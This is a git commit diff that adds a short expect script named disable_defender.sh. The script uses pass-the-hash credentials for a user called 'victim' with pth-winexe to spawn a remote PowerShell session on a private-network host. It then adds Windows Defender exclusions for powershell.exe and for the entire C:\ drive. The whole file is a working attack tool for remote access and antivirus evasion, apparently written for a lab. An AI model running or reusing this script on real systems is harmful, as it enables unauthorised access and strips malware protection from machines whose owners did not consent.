ba097d5827e85ef03097c0a6f5e0c4c7c651d2ba
sudonim007 <72618916+sudonim007@users.noreply.github.com>
2022-04-13 16:30:12 +0100

    Add files via upload

---
+++ disable_defender.sh
@@ -0,0 +1,9 @@
+#!/usr/bin/expect
+
+spawn /usr/bin/pth-winexe -U victim%aad3b435b51404eeaad3b435b51404ee:d00e5d238213d590200fcf3e6f3cd13c //192.168.57.25 --uninstall  powershell.exe
+expect "PS"
+send "Set-MpPreference -ExclusionProcess powershell.exe \n"
+send "Set-MpPreference -ExclusionPath C:\ \n"
+send "exit \n"
+
+interact
